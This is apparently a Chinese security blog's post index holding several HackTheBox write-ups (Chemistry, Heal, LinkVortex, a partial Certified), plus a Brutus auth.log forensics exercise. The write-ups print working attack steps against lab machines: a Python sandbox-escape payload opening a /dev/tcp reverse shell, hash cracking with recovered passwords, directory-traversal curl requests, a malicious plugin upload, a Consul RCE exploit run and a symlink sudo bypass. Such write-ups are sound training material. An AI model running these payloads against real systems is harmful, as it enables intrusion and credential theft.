*[().__class__.__mro__[1]]+[\u0026#34;__sub\u0026#34; + \u0026#34;classes__\u0026#34;]) () if d.__name__ == \u0026#34;BuiltinImporter\u0026#34;][0].load_module (\u0026#34;os\u0026#34;).system (\u0026#34;/bin/bash -c \\\u0026#39;sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/100 0\u0026gt;\u0026amp;1\\\u0026#39;\u0026#34;);0,0,0\u0026#39;\r_space_group_magn.number_BNS 62.448\r_space_group_magn.name_BNS \u0026#34;P n\u0026#39; m a\u0026#39; \u0026#34; 设置监听，上传之后点击View查看，可以看到成功反弹到Shell\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; 在instance目录下发现一个数据库文件\n可以开启一个httpserver的服务将其下载下来\n我在/home目录下发现了另一个用户：rosa，并且database.db中也存在他的密码hash，因此可以使用John The Ripper进行爆破密码\n[root@kali] /home/kali/Chemistry ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 ⏎\rUsing default input encoding: UTF-8\rLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\rWarning: no OpenMP support for this hash type, consider --fork=4\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\runicorniosrosados (?) 1g 0:00:00:00 DONE (2024-12-17 20:57) 1.265g/s 3774Kp/s 3774Kc/s 3774KC/s uniden206..unicornios2805\rUse the \u0026#34;--show --format=Raw-MD5\u0026#34; options to display all of the cracked passwords reliably\rSession completed. 得到用户密码\nusername：rosa\rpassword：unicorniosrosados SSH直接登录获取到User.txt\nReadAnyFiles #\r上传linpeas，发现存在开放的内网端口\n╔══════════╣ Active Ports\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 7928/bash tcp 0 0 0.0.0.0:9999 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - 将8080端口代理出来，我这里是代理到了本地的8000端口，因为8080端口是Bursuite的默认使用端口\nServer：Python/3.9 aiohttp/3.9.1 这是一个利用的点，搜索aiohttp的相关版本漏洞\nCVE-2024-23334: A Deep Dive into aiohttp\u0026rsquo;s Directory Traversal Vulnerability (ethicalhacking.uk) 找到一个目录穿越的漏洞，不过这里有一个坑，因为所有的poc都是基于/static目录进行穿越的，而这里的内网端口上没有这个目录\n存在/assets目录，我们可以基于这个目录来进行目录穿越\n根据上面文章里的测试一下，读取成功\n这里我本来想读取密码Hash然后爆破一下root的密码的，但是好像爆不出来😂，直接读取flag吧\n[root@kali] /home/kali/Chemistry ❯ curl -s --path-as-is \u0026#34;http://127.0.0.1:8000/assets/../../../../../root/root.txt\u0026#34; Summary #\rUser：就是简单的文件上传CVE反弹Shell，然后数据库信息泄露，爆破用户密码进行ssh登录。\nRoot：Webserver的版本漏洞，可以造成任意文件读取，不过有前提是必须要踏板目录存在，比如说这个Machine中不存在其他Poc中的/static，所以需要借助/assets目录来进行穿越。假如没有任何可访问目录的话，应该也就无法复现这个CVE了。也可以直接通过读取ssh密钥后进行root登录。\n","date":"2024-12-17","externalUrl":null,"permalink":"/posts/2024/12/htb-chemistry/","section":"Posts","summary":"","title":"HTB-Chemistry","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Heal ❯ nmap -sSCV -Pn heal.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 17:29 CST\rNmap scan report for heal.htb (10.10.11.46)\rHost is up (0.085s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)\r|_ 256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)\r80/tcp open http nginx 1.18.0 (Ubuntu)\r|_http-title: Heal\r|_http-server-header: nginx/1.18.0 (Ubuntu)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 12.40 seconds 开放端口：22、80\nSubdomainFuzz #\r[root@kali] /home/kali/Desktop ❯ ffuf -u http://heal.htb/ -w ./fuzzDicts/subdomainDicts/main.txt -H \u0026#34;Host:FUZZ.heal.htb\u0026#34; -mc 200\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://heal.htb/\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/subdomainDicts/main.txt\r:: Header : Host: FUZZ.heal.htb\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200\r________________________________________________\rapi [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 127ms]\r:: Progress: [167378/167378] :: Job [1/1] :: 446 req/sec :: Duration: [0:05:42] :: Errors: 0 :: 存在域名：api.heal.htb，添加到/etc/hosts\n在heal.htb/survey路由下发现一个子域名：take-survey.heal.htb\n添加到/etc/hosts，访问如下发现Administrator的用户名：ralph\nDirsearch #\r[root@kali] /home/kali/Desktop ❯ dirsearch -u \u0026#34;http://take-survey.heal.htb/index.php/\u0026#34; -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Desktop/reports/http_take-survey.heal.htb/_index.php__24-12-15_19-42-06.txt\rTarget: http://take-survey.heal.htb/\r[19:42:06] Starting: index.php/ [19:42:19] 200 - 75KB - /index.php/admin/mysql/index.php [19:42:23] 200 - 74KB - /index.php/apc/index.php [19:42:42] 200 - 74KB - /index.php/pma/index.php [19:42:54] 200 - 75KB - /index.php/web/phpMyAdmin/index.php Task Completed 访问/index.php/admin会自动跳转到一个登陆界面\nhttp://take-survey.heal.htb/index.php/admin/authentication/sa/login\nReadAnyFiles #\r任意注册一个账号，然后进入http://heal.htb/resume\n使用burpsuite打开intercept，然后点击EXPORT AS PDF\n在放行到第三个包的时候发现一个/download路由，可以进行任意文件读取\nGET /download?filename=../../../../../etc/passwd 发现两个用户的用户名：ralph、ron\n由于我们发现了该网站使用了Ruby on Rails，经过搜索得到其config的文件地址\nGET /download?filename=../../config/database.yml 将其下载下来\nGET /download?filename=../../storage/development.sqlite3 得到了ralph的密码hash\n使用John破解密码\n[root@kali] /home/kali/Heal ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt ⏎\rUsing default input encoding: UTF-8\rLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\rCost 1 (iteration count) is 4096 for all loaded hashes\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\r0g 0:00:00:08 0.00% (ETA: 2024-12-19 09:21) 0g/s 53.66p/s 53.66c/s 53.66C/s 12345678910..christina\r147258369 (?) 1g 0:00:00:09 DONE (2024-12-15 20:25) 0.1063g/s 53.61p/s 53.61c/s 53.61C/s pasaway..claire\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. 无法进行SSH登录，不过可以登录到网站后台\nLimeSurvey-RCE #\r在Github上找到一个脚本\n[github author=\u0026ldquo;Y1LD1R1M-1337\u0026rdquo; project=\u0026ldquo;Limesurvey-RCE\u0026rdquo;][/github]\n需要进行如下修改，一定要添加一个compatibility的版本为6.0和网站匹配，否则无法上传成功\n修改反弹SHELL里的IP和端口号\n然后进行打包\n❯ zip hyh_zip config.xml php-rev.php 上传并且激活插件\n然后访问http://take-survey.heal.htb/upload/plugins/hyh_hacker/php-rev.php路径即可反弹shell\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; 在/var/www/limesurvey/application/config/config.php中获取到数据库的用户名和密码\n这里离谱的居然是，进去查找到users表里面只存在一个ralph用户，他的密码hash爆破出来和上面的147258369是一模一样的。也就是说数据库中没有可以利用的东西。\n不过这里的密码可以让ron用户进行ssh登录，而不是ralph😡\nusername：ron\rpassword：AdmiDi0_pA$$w0rd Privilege Escalation #\r上传Linpeas.sh，发现开放了许多端口\n将8500端口通过ssh转发出来\n[root@kali] /home/kali/Heal ❯ ssh -L 8500:127.0.0.1:8500 ron@heal.htb 在网页源码里发现了版本信息：1.19.2\n通过查找版本漏洞，我在Exploit-DB中发现了可以利用的脚本\nHashicorp Consul v1.0 - Remote Command Execution (RCE) - Multiple remote Exploit (exploit-db.com) [root@kali] /home/kali/Heal ❯ python exploit.py 127.0.0.1 8500 10.10.16.29 6666 0\r[+] Request sent successfully, check your listener 设置NC监听得到反弹SHELL\n一开始我注意到这个脚本里面存在一个ACL token的参数，还尝试过ssh后用命令行生成一个token，但失败了。然后偶然发现这个token对于本机来说好像并没有什么效果，随便赋值都能成功执行脚本。\nSummary #\rUser：在遇到下载文件的路由时候，要仔细检查是否存在路径可以穿越，比如本机中的/download，就存在任意文件读取，配合Rails的Config文件地址，将数据库信息下载到成功进入后台，然后上传恶意插件Webshell，这个在之前的一个机器上也是遇到过的，最后反弹Shell读取配置文件SSH登录拿到User。\nRoot：Linux机器相较于Windows机器就没有那么多域内的一些权限问题，往往是一些可执行文件的权限不正确或者是内网端口服务的一些Web漏洞。本机的Root就是通过转发8500端口到kali，然后查找历史版本的CVE漏洞，最后反弹Shell拿到Root权限。\n","date":"2024-12-15","externalUrl":null,"permalink":"/posts/2024/12/htb-heal/","section":"Posts","summary":"","title":"HTB-Heal","type":"posts"},{"content":"\rSherlock Scenario #\r在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探索一个场景，其中 Confluence 服务器通过其 SSH 服务被暴力破解。获得对服务器的访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log 主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限提升、持久性方面，甚至对命令执行的一些可见性。\nTask1 #\r分析auth.log，您能否识别攻击者用于实施暴力攻击的 IP 地址？\n[root@kali] /home/kali/Brutus ❯ cat auth.log | grep \u0026#34;Invalid\u0026#34; Mar 6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380\rMar 6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392\rMar 6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444\rMar 6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436\rMar 6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422\rMar 6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498\rMar 6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390 IP：65.2.161.68\nTask2 #\r暴力破解尝试成功，攻击者获得了对服务器上帐户的访问权限。这个账户的用户名是什么？\n可以发现攻击源IP(65.2.161.68)对本机进行了三次密码爆破之后，成功登录了Root用户\nTask3 #\r您能否识别攻击者手动登录服务器以执行其目标时的时间戳？\n[root@kali] /home/kali/Brutus ❯ cat auth.log | grep -n \u0026#34;65.2.161.68\u0026#34; | grep \u0026#34;Accepted password\u0026#34;\r281:Mar 6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2\r322:Mar 6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2\r360:Mar 6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2 因为之前进行了爆破密码，在322行应该是手动登录的服务器\n这个时间2024-03-06 06:32:44直接交上去不对\n[root@kali] /home/kali/Brutus ❯ utmpdump wtmp 查看wtmp文件原始内容\n发现时间应该是：2024-03-06 06:32:45\nTask4 #\r登录时将跟踪 SSH 登录会话并为其分配会话编号。为问题 2 中的用户帐户分配给攻击者会话的会话号是什么？\n[root@kali] /home/kali/Brutus ❯ cat auth.log | grep -n \u0026#34;root\u0026#34; | grep \u0026#34;session\u0026#34; 因为手动登录是在322行，因此看322行之后的内容\nTask5 #\r攻击者在服务器上添加了一个新用户作为其持久性策略的一部分，并为此新用户帐户提供了更高的权限。此帐户的名称是什么？\n[root@kali] /home/kali/Brutus ❯ cat auth.log | grep -n \u0026#34;new\u0026#34; 335:Mar 6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002\r336:Mar 6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1 发现一个新用户：cyberjunkie\n[root@kali] /home/kali/Brutus ❯ cat auth.log | grep -n \u0026#34;cyberjunkie\u0026#34; cyberjunkie被添加到了sudo组内，具有超级权限\nTask6 #\r用于持久性的 MITRE ATT\u0026amp;CK 子技术 ID 是什么？\nMatrix - Enterprise | MITRE ATT\u0026amp;CK® ID：T1136.001\nTask7 #\r根据之前确认的身份验证时间和会话在 auth.log 内结束，攻击者的第一个 SSH 会话持续了多久（秒）\n在wtmp中可以看见\n6:32:45 --- 6:37:24 总共持续时间是279秒\nTask8 #\r攻击者登录了他们的后门帐户，并利用更高权限下载了脚本。使用 sudo 执行的完整命令是什么？\n[root@kali] /home/kali/Brutus ❯ cat auth.log | grep -n \u0026#34;cyberjunkie\u0026#34; 发现使用cyberjunkie账户远程下载了Linpeas分析脚本\n","date":"2024-12-10","externalUrl":null,"permalink":"/posts/2024/12/sherlocks-brutus/","section":"Posts","summary":"","title":"Sherlocks-Brutus","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap -sSCV -Pn LinkVortex.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 21:44 CST\rNmap scan report for LinkVortex.htb (10.10.11.47)\rHost is up (0.088s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)\r|_ 256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)\r80/tcp open http Apache httpd\r|_http-server-header: Apache\r| http-title: BitByBit Hardware\r|_Requested resource was http://linkvortex.htb/\r| http-robots.txt: 4 disallowed entries |_/ghost/ /p/ /email/ /r/\r|_http-generator: Ghost 5.58\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 20.62 seconds Subdomain Fuzz #\r[root@kali] /home/kali/LinkVortex ❯ ffuf -u http://linkvortex.htb/ -w ./fuzzDicts/subdomainDicts/main.txt -H \u0026#34;Host:FUZZ.linkvortex.htb\u0026#34; -mc 200 ⏎\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://linkvortex.htb/\r:: Wordlist : FUZZ: /home/kali/LinkVortex/fuzzDicts/subdomainDicts/main.txt\r:: Header : Host: FUZZ.linkvortex.htb\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200\r________________________________________________\rdev [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 73ms]\r:: Progress: [167378/167378] :: Job [1/1] :: 500 req/sec :: Duration: [0:05:55] :: Errors: 46 :: 发现存在：dev.linkvortex.htb，添加到/etc/hosts\nDirsearch #\r[root@kali] /home/kali/LinkVortex ❯ dirsearch -u linkvortex.htb -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/LinkVortex/reports/_linkvortex.htb/_24-12-08_21-50-06.txt\rTarget: http://linkvortex.htb/\r[21:50:06] Starting: [21:50:28] 200 - 15KB - /favicon.ico [21:50:34] 200 - 1KB - /LICENSE [21:50:44] 200 - 103B - /robots.txt [21:50:46] 200 - 255B - /sitemap.xml 查看/robots.txt\nUser-agent: *\rSitemap: http://linkvortex.htb/sitemap.xml\rDisallow: /ghost/\rDisallow: /p/\rDisallow: /email/\rDisallow: /r/ 进入/ghost路由，存在登录页面\n对dev.linkvortex.htb进行目录扫描\n[root@kali] /home/kali/LinkVortex ❯ dirsearch -u dev.linkvortex.htb -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3\r(_||| _) (/_(_|| (_| )\rExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/LinkVortex/reports/_dev.linkvortex.htb/_24-12-09_10-27-46.txt\rTarget: http://dev.linkvortex.htb/\r[10:27:46] Starting: [10:27:48] 200 - 557B - /.git/ [10:27:48] 200 - 73B - /.git/description [10:27:48] 200 - 201B - /.git/config\r[10:27:48] 200 - 41B - /.git/HEAD\r[10:27:48] 200 - 620B - /.git/hooks/ [10:27:48] 200 - 402B - /.git/info/ [10:27:48] 200 - 240B - /.git/info/exclude [10:27:48] 200 - 401B - /.git/logs/ [10:27:48] 200 - 175B - /.git/logs/HEAD\r[10:27:48] 200 - 418B - /.git/objects/ [10:27:48] 200 - 393B - /.git/refs/ [10:27:48] 200 - 147B - /.git/packed-refs [10:27:49] 200 - 691KB - /.git/index GitHack #\r存在Git泄露，使用GitHack工具将其拉取下来\n[root@kali] /home/kali/LinkVortex/GitHack (master) ⚡ ❯ python GitHack.py -u \u0026#34;http://dev.linkvortex.htb/.git/\u0026#34; 可以发现里面存在一些password关键字\n可以使用第一个密码进行登录\nusername: admin@linkvortex.htb\rpassword: OctopiFociPilfer45 成功进入后台\n通过Wappalyzer扩展可以发现，当前GhostCMS的版本是5.58\nUser #\rCVE-2023-40028 #\r通过Google查询，我发现了这个\n[github author=\u0026ldquo;0xyassine\u0026rdquo; project=\u0026ldquo;CVE-2023-40028\u0026rdquo;][/github]\n需要修改的地方\n[root@kali] /home/kali/LinkVortex/CVE-2023-40028 (master) ⚡ ❯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45\rWELCOME TO THE CVE-2023-40028 SHELL\rfile\u0026gt; /etc/passwd\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\rnode:x:1000:1000::/home/node:/bin/bash 成功读取到/etc/passwd\n在GitHack中还发现了一个Dockerfile\n[root@kali] /home/kali/LinkVortex/GitHack/dev.linkvortex.htb (master) ⚡ ❯ cat Dockerfile.ghost FROM ghost:5.58.0\r# Copy the config\rCOPY config.production.json /var/lib/ghost/config.production.json\r# Prevent installing packages\rRUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb\r# Wait for the db to be ready first\rCOPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh\rCOPY entry.sh /entry.sh\rRUN chmod +x /var/lib/ghost/wait-for-it.sh\rRUN chmod +x /entry.sh\rENTRYPOINT [\u0026#34;/entry.sh\u0026#34;]\rCMD [\u0026#34;node\u0026#34;, \u0026#34;current/index.js\u0026#34;] 尝试读取这个/var/lib/ghost/config.production.json配置文件\n[root@kali] /home/kali/LinkVortex/CVE-2023-40028 (master) ⚡ ❯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45\rWELCOME TO THE CVE-2023-40028 SHELL\rfile\u0026gt; /var/lib/ghost/config.production.json\r{\r\u0026#34;url\u0026#34;: \u0026#34;http://localhost:2368\u0026#34;,\r\u0026#34;server\u0026#34;: {\r\u0026#34;port\u0026#34;: 2368,\r\u0026#34;host\u0026#34;: \u0026#34;::\u0026#34;\r},\r\u0026#34;mail\u0026#34;: {\r\u0026#34;transport\u0026#34;: \u0026#34;Direct\u0026#34;\r},\r\u0026#34;logging\u0026#34;: {\r\u0026#34;transports\u0026#34;: [\u0026#34;stdout\u0026#34;]\r},\r\u0026#34;process\u0026#34;: \u0026#34;systemd\u0026#34;,\r\u0026#34;paths\u0026#34;: {\r\u0026#34;contentPath\u0026#34;: \u0026#34;/var/lib/ghost/content\u0026#34;\r},\r\u0026#34;spam\u0026#34;: {\r\u0026#34;user_login\u0026#34;: {\r\u0026#34;minWait\u0026#34;: 1,\r\u0026#34;maxWait\u0026#34;: 604800000,\r\u0026#34;freeRetries\u0026#34;: 5000\r}\r},\r\u0026#34;mail\u0026#34;: {\r\u0026#34;transport\u0026#34;: \u0026#34;SMTP\u0026#34;,\r\u0026#34;options\u0026#34;: {\r\u0026#34;service\u0026#34;: \u0026#34;Google\u0026#34;,\r\u0026#34;host\u0026#34;: \u0026#34;linkvortex.htb\u0026#34;,\r\u0026#34;port\u0026#34;: 587,\r\u0026#34;auth\u0026#34;: {\r\u0026#34;user\u0026#34;: \u0026#34;bob@linkvortex.htb\u0026#34;,\r\u0026#34;pass\u0026#34;: \u0026#34;fibber-talented-worth\u0026#34;\r}\r}\r}\r} 得到用户名和密码\nusername:bob@linkvortex.htb\rpassword:fibber-talented-worth ssh登录后拿到user.txt\nRoot #\r检查Bob的命令权限\nbob@linkvortex:~$ sudo -l\rMatching Defaults entries for bob on linkvortex:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty,\renv_keep+=CHECK_CONTENT\rUser bob may run the following commands on linkvortex:\r(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png 查看这个/opt/ghost/clean_symlink.sh\nbob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh #!/bin/bash\rQUAR_DIR=\u0026#34;/var/quarantined\u0026#34;\rif [ -z $CHECK_CONTENT ];then\rCHECK_CONTENT=false\rfi\rLINK=$1\rif ! [[ \u0026#34;$LINK\u0026#34; =~ \\.png$ ]]; then\r/usr/bin/echo \u0026#34;! First argument must be a png file !\u0026#34;\rexit 2\rfi\rif /usr/bin/sudo /usr/bin/test -L $LINK;then\rLINK_NAME=$(/usr/bin/basename $LINK)\rLINK_TARGET=$(/usr/bin/readlink $LINK)\rif /usr/bin/echo \u0026#34;$LINK_TARGET\u0026#34; | /usr/bin/grep -Eq \u0026#39;(etc|root)\u0026#39;;then\r/usr/bin/echo \u0026#34;! Trying to read critical files, removing link [ $LINK ] !\u0026#34;\r/usr/bin/unlink $LINK\relse\r/usr/bin/echo \u0026#34;Link found [ $LINK ] , moving it to quarantine\u0026#34;\r/usr/bin/mv $LINK $QUAR_DIR/\rif $CHECK_CONTENT;then\r/usr/bin/echo \u0026#34;Content:\u0026#34;\r/usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u0026gt;/dev/null\rfi\rfi\rfi 如果文件名后缀是 .png，并且文件是符号链接，且目标路径 不包含 etc 或 root（即目标不是敏感文件），脚本会：\n将符号链接 移动到 /var/quarantined 目录。\n如果 CHECK_CONTENT=true，脚本会尝试输出该文件的内容。\n然后创建符号链接，连接到root.txt下，由于脚本会检查参数，可以使用二次链接来进行绕过，同时将CHECK_CONTENT设置为true\nbob@linkvortex:~$ ln -s /root/root.txt hyh.txt\rbob@linkvortex:~$ ln -s /home/bob/hyh.txt hyh.png\rbob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png Summary #\r获取User的过程是正常的一些信息收集、端口以及子域名扫描等。很明显是dev开发环境存在Githack泄露，开发人员在部署上去的时候并没有关掉这个开发环境。GhostCMS的版本没有被及时更新，存在任意文件读取的CVE，因此获取到了ssh用户的账号密码。\n这个machine的Root获取似乎不需要及到提权，而是使用特殊权限的脚本对任意文件进行读取。因为clean_symlink.sh只是对命令行中的参数进行过滤，而符号链接是可以一个接着一个形成符号链接链条，从而直接读取到root.txt。（实际上也可以读取root的ssh公钥或者是密码hash，来尝试进行ssh登录，这个我就没有去尝试了，因为通过这个脚本已经可以任意文件读取。But You Can Try It ! ）\n","date":"2024-12-09","externalUrl":null,"permalink":"/posts/2024/12/htb-linkvortex/","section":"Posts","summary":"","title":"HTB-LinkVortex","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09\nNmap #\r┌──(root㉿kali)-[/home/kali/Certified]\r└─# nmap -sSCV -Pn -p- Certified.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 20:00 CST\rStats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 90.13% done; ETC: 20:02 (0:00:15 remaining)\rStats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\rService scan Timing: About 61.90% done; ETC: 20:04 (0:00:25 remaining)\rStats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\rService scan Timing: About 61.90% done; ETC: 20:04 (0:00:25 remaining)\rNmap scan report for Certified.htb (10.10.11.41)\rHost is up (0.083s latency).\rNot shown: 65514 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-06 18:49:00Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=DC01.certified.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\r| Not valid before: 2024-05-13T15:49:36\r|_Not valid after: 2025-05-13T15:49:36\r|_ssl-date: 2024-12-06T18:50:32+00:00; +6h45m59s from scanner time.\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=DC01.certified.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.certified.htb\r| Not 